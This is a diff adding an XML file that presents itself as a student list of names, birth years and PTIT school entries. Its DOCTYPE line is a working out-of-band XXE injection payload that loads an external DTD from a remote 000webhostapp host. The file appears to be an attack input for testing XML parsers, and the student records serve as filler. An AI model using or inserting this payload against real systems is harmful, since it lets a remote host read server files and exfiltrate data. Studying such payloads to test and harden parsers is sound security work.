@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://sanglv11.000webhostapp.com/test.dtd">  %xxe; ]>
+<liststudent>
+    <student>
+        <name>Le Van Sang</name>
+        <dob>1999</dob>
+        <schoolname>PTIT</schoolname>
+    </student>
+    <student>
+        <name>Sang Le Van</name>
+        <dob>1998</dob>
+        <schoolname>PTIT</schoolname>
+    </student>
+    <student>
+        <name>Sanglv</name>
+        <dob>1997</dob>
+        <schoolname>Buu chinh vien thong</schoolname>
+    </student>
+    <student>
+        <name>sanglv11</name>
+        <dob>1996</dob>
+        <schoolname>Hoc vien buu chinh</schoolname>
+    </student>
+</liststudent>
